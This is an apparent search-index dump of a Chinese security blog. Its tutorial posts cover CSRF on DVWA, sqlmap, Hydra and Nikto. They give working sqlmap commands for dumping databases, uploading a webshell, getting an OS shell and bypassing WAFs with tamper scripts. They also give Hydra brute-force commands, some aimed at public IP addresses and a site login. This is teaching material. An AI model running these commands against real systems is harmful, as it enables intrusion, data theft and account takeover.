在安全研究中，研究人员通常会编写POC来展示一个新发现的漏洞，以便其他人能够理解漏洞的工作原理，并验证其在真实环境中的有效性。POC也经常用于向厂商报告漏洞，以便他们能够及时修复。 综上所述，POC是漏洞利用的实际示例，用于证明漏洞的存在和危害性。 ","date":"2025-05-28","objectID":"/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/:1:2","tags":["kali"],"title":"CSRF-跨站请求伪造","uri":"/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"},{"categories":["网络安全"],"content":"攻击流程-DVWA模拟靶场 随便输入将更改的密码进行抓包，得到 抓包后可以看到能进行构造的poc 进行如图所示选项 点击复制，将攻击url复制到一个 新界面中后打开。 点击按钮即可完成攻击 直接放包后，用新密码即可完成登录。","date":"2025-05-28","objectID":"/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/:1:3","tags":["kali"],"title":"CSRF-跨站请求伪造","uri":"/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"},{"categories":["网络安全"],"content":"学安全的都知道这个注入神器 Sqlmap，也正是这些神器的出现，我们逐渐变成了“脚本小子”，要想变成大佬，就要求不仅会用还会写，在面试中也是经常会问 Sqlmap 原理，或者自动化注入这样的问题，所以就深入来学一学 Sqlmap Sqlmap 使用 Python 语言开发，原来用的 Python2 新版本 1.5 使用 Python3，分析使用的也是 1.5 版本 项目地址：https://github.com/sqlmapproject/sqlmap 中文文档：https://sqlmap.campfire.ga 阅读文档是发现的一个有趣的项目：中文文档编写指北，https://github.com/mzlogin/chine-copywriting-guidelines Sqlmap 具有以下功能 识别有漏洞的参数 针对有漏洞的参数，自动选取对应类型的 SQL 注入技术 识别后端 DBMS 的相关指纹信息 根据用户使用的选项，它还能采集尽可能多的指纹信息，拉取数据或是掌管整个数据库服务器 之后会对这些功能原理进行分析 ","date":"2025-05-27","objectID":"/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["kali"],"title":"Sqlmap-SQL注入漏洞","uri":"/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["网络安全"],"content":"基础命令 判断网址有无SQL注入漏洞 sqlmap -u \"⽹址\" 结束以后会得到该⽹站的数据库、操作系统、服务器等版本信息 如果存在漏洞可以使用以下命令注出当前网站下所有数据库名 sqlmap -u \"⽹址\" --dbs 注出指定数据库下的所有表名 sqlmap -u \"⽹址\" -D 数据库名 --tables 注出指定数据库指定表下所有列信息 sqlmap -u \"⽹址\" -D 数据库名 -T 表名 --columns 注出所有指定列数据 sqlmap -u \"⽹址\" -D 数据库名 -T 表名 -C 列名 --dump 在任意环节使用–dumps，可以将所有数据注出，如指定数据库使用，注出所有数据库下的所有表的所有字段信息 python3 .\\sqlmap.py -u \"http://127.0.0.1:8888/Less-2/?id=1\" -D test --dump --batch命令可以自动跳过选择项，按默认选项注入 ","date":"2025-05-27","objectID":"/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:1","tags":["kali"],"title":"Sqlmap-SQL注入漏洞","uri":"/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["网络安全"],"content":"进阶命令 此部分参考 sqlmap 手册，在手册基础上进行了精炼 输出信息的详细程度 -v #共7个级别(0~6)，默认为1 #可以用 -vv 代替 -v 2，推荐使用这种方法 0：只输出 Python 出错回溯信息，错误和关键信息 1：增加输出普通信息和警告信息 2：增加输出调试信息 3：增加输出已注入的 payloads 4：增加输出 HTTP 请求 5：增加输出 HTTP 响应头 6：增加输出 HTTP 响应内容 目标 -d #直连数据库，\"mysql://root:root@192.168.0.8:3306/testdb\" -u URL -l #从Burp代理日志文件中解析目标地址 -m #从文本文件中批量获取目标 -r #从文件中读取 HTTP 请求 -g #使用 Google dork 结果作为目标地址 python sqlmap.py -g \"inurl:\\\".php?id=1\\\"\" -c #从 INI 配置文件中读取选项 --purge #清除历史缓存 --flush-session #清除上次扫描的缓存 注：-d是一个一个新的开关选项，它允许你通过 DBMS 守护进程监听的 TCP 端口直接连接目标数据库服务器，便于使用 SQL 注入技术对目标数据库进行攻击 指定连接时信息 指定连接目标地址的方式 --method=METHOD #强制使用提供的 HTTP 方法（例如：PUT） --data=DATA #使用 POST 发送数据串；--data=\"id=1\u0026user=admin\" --param-del=\";\" #使用参数分隔符，--data=\"id=1;user=admin\" --cookie=COOKIE #指定 HTTP Cookie ，--cookie \"id=11\" --level 2 --drop-set-cookie #忽略 HTTP 响应中的 Set-Cookie 参数 --user-agent=AGENT #指定 HTTP User-Agent --random-agent #使用随机的 HTTP User-Agent，随机从 ./txt/user-agents.txt 选一个，不是每次请求换一个 --host #手动设置 HTTP Host 请求头值，默认情况下，HTTP Host 请求头从提供的目标 URL 中解析 --referer=REFERER #指定 HTTP Referer，默认情况下不会在 HTTP 请求中发送 HTTP Referer 请求头 -H HEADER #设置额外的 HTTP 头参数（例如：\"X-Forwarded-For: 127.0.0.1\"） --headers=HEADERS #设置额外的 HTTP 头参数,必须以换行符分隔（例如：\"Accept-Language: fr\\nETag: 123\"） --auth-type，--auth-cred #选项用于指定后端 Web 服务器实现的 HTTP 协议认证和所有向目标程序发起 HTTP 请求的有效凭据，支持的三种 HTTP 协议认证机制是：Basic、Digest、NTLM，认证凭据的语法是 username:password。一个符合语法的例子：$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id\\=1\" --auth-type Basic --auth-cred \"testuser:testpass\" --auth-file #HTTP 协议私钥认证 --ignore-code #忽略（有问题的）HTTP 错误码 --proxy，--proxy-cred，--proxy-file 和 --ignore-proxy #HTTP(S) 代理，--proxy 并提供 HTTP(S) 代理地址使 HTTP(S) 请求经过该代理到达目标 URL。设置 HTTP(S) 代理的语法是 http://url:port。如果 HTTP(S) 代理需要身份验证，则可以对选项 --proxy-cred 使用 username:password 格式添加对应的凭证可以使用选项 --proxy-file 并指定包含批量代理的文件，想要使用 sqlmap 对本地局域网目标进行测试时应该使用开关 --ignore-proxy 来绕过系统级的 HTTP(S) 代理服务 --delay=10 #设置每个 HTTP 请求的延迟秒数 --safe-freq=SAFE #每访问两次给定的合法 URL 才发送一次测试请求 --csrf-token 和 --csrf-url #绕过反 CSRF 防护 -force-ssl #支持https的S","date":"2025-05-27","objectID":"/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:2","tags":["kali"],"title":"Sqlmap-SQL注入漏洞","uri":"/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["网络安全"],"content":"用例 指定数据包注入 从文件读取HTTP请求，GET和POST都可以 sqlmap -r \"burp.txt\" -p \"username\" #-p 指定存在注入的参数 这里的 txt 文件就是完整的 http 请求包，可以使用 -p 指定参数，也可以在 txt 文件中使用 *（星号）定位，特别是注入点后需要使用闭合语句的情况下 Cookie注入 sqlmap -u \"http://www.vuln.com\" --cookie \"id=11\" --level 2 当防火墙对请求速度做了限制 sqlmap -u \"http://www.vuln.com/post.php?id=1\" --delay=10 # 在每个HTTP请求之间的延迟10秒 伪静态注入 sqpmap -u http://victim.com/id/666*.html --dbs #在html扩展名前加个'*' 暴力破解 当数据库为以下情况时，需要暴力破解表名和列名 DBMS（Database Management System，数据库管理系统）是 \u003c 5.0 版本的 MySQL，它们不具备 information_schema DBMS 是微软的 Access 数据库，并且其中的系统表 MSysObjects 默认设置不可读 当前会话用户对 DBMS 中存储数据表定义的系统表没有读权限 暴力破解表名 只要开启了 --common-tables，sqlmap 仍然可以识别出部分系统数据表。sqlmap 会尝试对系统表进行暴力破解，试图找出 DBMS 中存在的常见数据表，常见的数据表名列表存储在 txt/common-tables.txt，支持用户进行任意修改 python sqlmap.py -u \"http://192.168.136.129/mysql/get_int_4.php?id=1\" --common-tables -D testdb 暴力破解列名 开启了 –columns 开关，sqlmap 则会提示你是否使用暴力破解技术。因而，就算出现上面两个场景之一，只要你开启了 –common-columns，sqlmap 仍然可以识别出部分系统数据表。sqlmap 会尝试对系统表进行暴力破解，试图找出 DBMS 中存在的常见数据表列名，常见的数据表名列表存储在 txt/common-columns.txt，支持用户进行任意修改 文件操作 仅对MySQL、MSSQL、PostgreSQL有效，可以进行文件操作 前提： 数据库用户有读写权限 有目录读写文件权限 sqlmap -u url --is-dba #查看是否dba权限,必须为root权限 sqlmap -u url --file-read \"C:/Windows/win.ini\" #读取文件 sqlmap -u url --file-write=D:/shell.php --file-dest=C:/www/shell.php #上传文件 (本地木马路径:目标网站目录) 执行命令 仅对MySQL、MSSQL、PosgreSQL有效 前提： 数据库用户有读写权限 有目录读写文件权限 sqlmap 能够在数据库所在服务器的操作系统上运行任意的命令 sqlmap -u \"URL\" --os-shell #获取系统交互shell或--os-cmd=id执行系统命令 原理就是上传一个 upload 木马后，再上传一个cmd shell 当 –os-shell退出后， 会调用后门脚本删除上传文件后，进行自删除 在 MySQL 和 PostgreSQL 中，sqlmap 可以上传一个包含两个用户自定义函数 分别为 sys_exec() 和 sys_eval() 的共享库（二进制文件），然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。 在 Microsoft SQL Server 中，sqlmap 会利用 xp_cmdshell 存储过程： 如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；如果该存储过程不存在，sqlmap 则会重新创建它，当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。相反，如果无需标准输出对应结果，sqlmap 则会使用堆叠查询注入（Stacked queries）技术执行相关的命令。 如果堆叠查询没有被 Web 应用识别出来，并且 DBMS 为 MySQL，假如后端 DBMS 和 Web 服务器在同一台服务器上，则仍可以通过利用 SELECT 语句中的 INTO OUTFILE，在 根目录","date":"2025-05-27","objectID":"/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:3","tags":["kali"],"title":"Sqlmap-SQL注入漏洞","uri":"/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["网络安全"],"content":"Tamper脚本 此部分转载自li qun师傅博客：https://ailiqun.xyz/2020/06/15/tamper tamper 脚本可以用来对 sqlmap 的 sql 查询语句进行一次处理，让其绕过过滤，tamper 脚本在 sqlmap 安装目录的 tamper 目录下 use age：sqlmap.py --tamper=\"模块名.py\" tamper 适用的数据库类型 \u0026 版本 自带tamper介绍 apostrophemask.py 功能：对引号进行 utf-8 格式编码 (% EF% BC%87) 平台：All 举例：1 AND ‘1’=’1 ==\u003e 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871 apostrophenullencode.py 功能：用非法的双 unicode 字符 (%00%27) 替换引号字符 平台：All 举例：1 AND ‘1’=’1 ==\u003e 1 AND %00%271%00%27=%00%271 appendnullbyte.py 功能：在有效载荷结束位置加载零字节字符编码 平台：Microsoft Access 举例：1 AND 1=1 ==\u003e 1 AND 1=1%00 base64encode.py 功能：用 base64 格式进行编码 平台：All 举例：1’ AND SLEEP (5)# ==\u003e MScgQU5EIFNMRUVQKDUpIw== between.py 功能：用 between 替换大于号（\u003e） 平台：Mssql2005、MySQL 4/5.0/5.5、Oracle 10g、PostgreSQL 8.3/8.4/9.0 举例： 1 AND A \u003e B – ==\u003e 1 AND A NOT BETWEEN 0 AND B – 1 AND A = B – ==\u003e 1 AND A BETWEEN B AND B – bluecoat.py 功能：对 SQL 语句替换空格字符为 (%09)，并替换”=”—\u003e”LIKE” 平台：MySQL 5.1, SGOS 举例：SELECT username FROM users WHERE id = 1 ==\u003e SELECT%09username FROM%09users WHERE%09id LIKE 1 apostrophemask.py 功能：用 utf-8 格式编码引号 (如：% EF% BC%87) 平台：All 举例：1 AND ‘1’=’1 ==\u003e 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871 charunicodeencode.py 功能：对字符串进行 Unicode 格式转义编码 平台：Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET 举例：SELECT FIELD%20FROM TABLE ==\u003e % u0053% u0045% u004C% u0045% u0043% u0054% u0020% u0046% u0049% u0045% u004C% u0044% u0020% u0046% u0052% u004F% u004D% u0020% u0054% u0041% u0042% u004C% u0045 charencode.py 功能：采用 url 格式编码 1 次 平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 举例：SELECT FIELD FROM%20TABLE ==\u003e %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45 chardoubleencode.py 功能：采用 url 格式编码 2 次 平台：All 举例：SELECT FIELD FROM%20TABLE ==\u003e %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545 commalessmid.py 功能：将 payload 中的逗号用 from 和 for 代替，用于过滤了逗号并且是 3 个参数的情况 平台：MySQL 5.0, 5.5 举例：MID (VERSION (), 1, 1) ==\u003e MID (VERSION () FROM 1 FOR 1) concat2concatws.py 功能：CONCAT () ==\u003e ","date":"2025-05-27","objectID":"/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:4","tags":["kali"],"title":"Sqlmap-SQL注入漏洞","uri":"/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["网络安全"],"content":"一、Hydra简介 Hydra，俗称九头蛇，是一款非常强大的暴力破解工具，支持多种服务协议的账号和密码进行爆破，包括Web登录、数据库、SSH、FTP等服务，支持Linux、Windows、Mac平台安装。 它是由著名的黑客组织THC开发的一款开源暴力破解、验证性质的工具。 目前该工具支持以下协议的爆破： AFP，Cisco AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP / R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP。 ","date":"2025-05-27","objectID":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/:1:0","tags":["kali"],"title":"hydra-暴力破解工具-支持多种协议","uri":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/"},{"categories":["网络安全"],"content":"二、Hydra安装 Hydra的远程仓库如下，大家可以fork到自己账号下，然后git clone到本地使用即可。 git远程仓库地址：git@gitee.com:changpei12315/thc-hydra-windows.git git下载后的目录如下： 可以配置该目录到环境变量path中，方便后续使用。 ","date":"2025-05-27","objectID":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/:2:0","tags":["kali"],"title":"hydra-暴力破解工具-支持多种协议","uri":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/"},{"categories":["网络安全"],"content":"三、Hydra基本使用 ","date":"2025-05-27","objectID":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/:3:0","tags":["kali"],"title":"hydra-暴力破解工具-支持多种协议","uri":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/"},{"categories":["网络安全"],"content":"1、常见参数 Hydra是一个命令行工具，所有的操作都是通过命令和参数实现的，如下就是最常见的Hydra暴力破解的参数： 选项 说明 -R 继续上一次破解 -I 忽略现有还原文件（不等待10秒） -s PORT 指定默认端口 -l LOGIN 指定破解登录用户名 -L FILE 使用文件指定多个用户名 -p PASS 指定密码 -P FILE 指定密码字典 -x MIN:MAX:CHARSET 密码暴力生成 -y 禁止在暴力破解中使用符号 -r 对选项-x使用非随机方法 -e nsr n：空密码试探，s：使用指定用户和密码试探。 -u 循环用户 -C FILE 冒号分隔用户名密码：“login:pass” 格式 -M FILE 要攻击的服务器列表，每行一个条目，’:‘指定端口 -o FILE 将找到的登录/密码写入文件 -b FORMAT 指定-o输出格式，默认text,可选json, jsonv1 -f / -F 找到用户名/密码后中止破解，-f:每个主机，-F：所有 -t TASKS 每个主机并行线程数，默认16 -T TASKS 所有并行线程数，默认64 -w / -W TIME 最大等待响应时间 -c TIME 所有进程每次尝试登录等待时间 -4 / -6 IPv4(默认)/IPv6地址 -v / -V / -d 详细日志模式/每次尝试仅显示用户名密码/调试模式 -k 不重做失败的尝试（适用于-M批量扫描） -q 不要打印错误连接消息 -U 服务模块详细使用信息 ","date":"2025-05-27","objectID":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/:3:1","tags":["kali"],"title":"hydra-暴力破解工具-支持多种协议","uri":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/"},{"categories":["网络安全"],"content":"2、案例1-ftp服务账号破解 提前准备一个ftp服务器，以及登录账号和密码（allen、123456），我们可以使用单个用户名破解密码。 aa.txt文件是需要提前准备的常用密码字典，需要包括123456才行。 hydra -l allen -P e:\\aa.txt ftp://127.0.0.1 ","date":"2025-05-27","objectID":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/:3:2","tags":["kali"],"title":"hydra-暴力破解工具-支持多种协议","uri":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/"},{"categories":["网络安全"],"content":"3、案例2-mysql账号破解 提前准备一个mysql服务器，以及登录账号和密码（root、root），我们可以使用单个用户名破解密码。 aa.txt文件是需要提前准备的常用密码字典，需要包括root才行。 -e nsr :指定可以尝试空密码。 hydra -l root -P e:\\aa.txt -e nsr 127.0.0.1 mysql ","date":"2025-05-27","objectID":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/:3:3","tags":["kali"],"title":"hydra-暴力破解工具-支持多种协议","uri":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/"},{"categories":["网络安全"],"content":"4、案例3-ssh账号破解 案例中的以阿里云服务器演示，给的指令中的地址和密码需要换成自己的。 hydra -l root -p 123456 120.26.12.53 ssh hydra -l root -p 123456 ssh://120.26.12.53 hydra -l root -P e:\\aa.txt -e nsr ssh://120.26.12.53 hydra -l root -P e:\\aa.txt -e nsr -vV ssh://120.26.12.53 -v参数显示详细的暴力破解的过程。 ","date":"2025-05-27","objectID":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/:3:4","tags":["kali"],"title":"hydra-暴力破解工具-支持多种协议","uri":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/"},{"categories":["网络安全"],"content":"5、案例4-HTTP协议中POST请求破解 可以使用hydra通过网站的登录请求（一般是post），来破解账号和密码（案例中的网址和密码需替换）。 基本的命令为： hydra -l \u003cusername\u003e -P \u003cwordlist\u003e 10.10.146.53 http-post-form \"/:username=^USER^\u0026password=^PASS^:F=incorrect\" -V 选项解释： -l ：指定单个的用户名 -s ：指定端口号 -L ：用户名文件 -p ：密码列表文件 http-post-form：输入提交表单的格式以及字段的名称 F：用户名密码错误时返回页面的含有的词汇 1）我们先通过抓包工具fiddler抓取登录请求，查看接口的请求地址 http://39.101.167.53/qftest/user/login.html?step=submit 2）查看登录post请求的提交的form-data表达数据 username=bk2301_001\u0026password=200c6d94e583e62c6964de3acdc723e5 3）设计hydra的指令 hydra -l bk2301_001 -P e:\\aa.txt -V 39.101.167.53 http-post-form \"/qftest/user/login.html?step=submit:username=^USER^\u0026password=^PASS^:error\" -l root 指定单个用户名“root”。（可替换成-L 字典.txt来指定一系列用户名） -P cyzidian.txt 指定密码字典cyzidian.txt（可替换成-p 密码 指定单个密码，一般不常用）。 -o out.txt 将尝试过程与结果保存到out.txt -vV显示详细过程 -f 找到一个结果后停止 39.101.167.53 目标ip地址 http-post-form 使用http协议下的post方法进行破解 4）添加断言 “/qftest/user/login.html?step=submit:username=^USER^\u0026password=^PASS^:error” 这段字符串由三部分组成，由其中的两个冒号划分： 第一部分只有一个”/qftest/user/login.html?step=submit“，是指定登录页面所在目录 第二部分：username=^USER^\u0026password=^PASS^，由上文可知这就是刚刚在network中看到的POST提交的内容只是把用户名和密码部分换成了^USER^和^PASS^。USER对应前面的-l 后跟的用户名root，PASS会被字典中的密码逐个替换。 最后一部分error是指定的判断密码是否正确的条件，默认是黑名单模式，也就是如果返回页面中存在”error“就说明这个密码不正确 ","date":"2025-05-27","objectID":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/:3:5","tags":["kali"],"title":"hydra-暴力破解工具-支持多种协议","uri":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/"},{"categories":["网络安全"],"content":"四、常见的密码字典 收集了一些国内网友常用的密码，可以整理为自己的密码字典，这个字典大家可以持续维护，不断完备。 安全测试 | 密码字典生成工具-crunch、cupp的使用 - 知乎 ","date":"2025-05-27","objectID":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/:4:0","tags":["kali"],"title":"hydra-暴力破解工具-支持多种协议","uri":"/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/"},{"categories":["网络安全"],"content":"工具简介 Nikto 是一款开源的 web 服务器扫描工具，旨在检测 web 服务器的安全漏洞。它通过测试多个 web 服务器并扫描已知的漏洞，如危险文件、错误配置、缺失的补丁等，为安全研究人员和系统管理员提供了强大的扫描功能。Nikto 能够识别超过 6700 个潜在危险的文件/CGIs，检查超过 1250 个 web 服务器版本，并提供大量服务器和扫描插件。 ","date":"2025-05-27","objectID":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/:1:0","tags":["kali"],"title":"Nikto-服务器安全漏洞扫描","uri":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"categories":["网络安全"],"content":"功能与特点 开源免费：Nikto 是开源工具，免费供个人和企业使用。 多协议支持：支持 HTTP、HTTPS、HTTPd、SunONE、Apache、IIS 等多种协议和服务器类型。 广泛的漏洞库：拥有丰富的漏洞库，能够检测大量已知的漏洞和安全问题。 易于使用：简单的命令行界面，易于集成到自动化脚本中。 插件支持：支持使用插件进行扩展，提供自定义扫描功能。 ","date":"2025-05-27","objectID":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/:2:0","tags":["kali"],"title":"Nikto-服务器安全漏洞扫描","uri":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"categories":["网络安全"],"content":"使用教程 ","date":"2025-05-27","objectID":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/:3:0","tags":["kali"],"title":"Nikto-服务器安全漏洞扫描","uri":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"categories":["网络安全"],"content":"安装 Nikto 在 Linux 上安装 更新系统包管理器，打开终端，运行以下命令更新系统包管理器： sudo apt update 安装 Nikto,使用包管理器安装 Nikto： sudo apt install nikto 在 Windows 上安装 下载 Nikto： 从 Nikto 的 官方 GitHub 仓库 下载最新版本的 Nikto 压缩包，并解压到本地目录。 安装 Perl： Nikto 依赖于 Perl，请确保系统安装了 Perl。可以从 Strawberry Perl 下载并安装。 配置环境变量： 将 Perl 和 Nikto 的可执行文件路径添加到系统环境变量中，以便在命令提示符中直接运行 Nikto。 ","date":"2025-05-27","objectID":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/:3:1","tags":["kali"],"title":"Nikto-服务器安全漏洞扫描","uri":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"categories":["网络安全"],"content":"使用 Nikto 进行基本扫描 打开终端或命令提示符,运行 Nikto 扫描命令： 使用以下命令对目标 web 服务器进行扫描： nikto -h http://example.com 其中，http://example.com 是目标服务器的 URL。执行此命令后，Nikto 将开始扫描目标服务器并输出扫描结果。 ","date":"2025-05-27","objectID":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/:3:2","tags":["kali"],"title":"Nikto-服务器安全漏洞扫描","uri":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"categories":["网络安全"],"content":"高级功能 指定扫描端口： 可以通过 -p 参数指定要扫描的端口，例如： nikto -h http://example.com -p 8080 保存扫描结果： 使用 -o 参数将扫描结果保存到文件中，指定格式为 -Format，例如： nikto -h http://example.com -o scan_results.html -Format htm 忽略 SSL 证书检查： 使用 -ssl 参数忽略 SSL 证书检查，对 HTTPS 服务器进行扫描： nikto -h https://example.com -ssl 使用插件： 可以使用 -Plugins 参数加载特定插件进行扫描： nikto -h http://example.com -Plugins \"apacheusers\" ","date":"2025-05-27","objectID":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/:3:3","tags":["kali"],"title":"Nikto-服务器安全漏洞扫描","uri":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"categories":["网络安全"],"content":"生成详细报告 导出扫描结果： 使用 -output 参数导出扫描结果到指定文件中： nikto -h http://example.com -output /path/to/report.txt 生成 HTML 报告： 使用 -Format 参数指定输出格式为 HTML，并保存报告： nikto -h http://example.com -o /path/to/report.html -Format htm 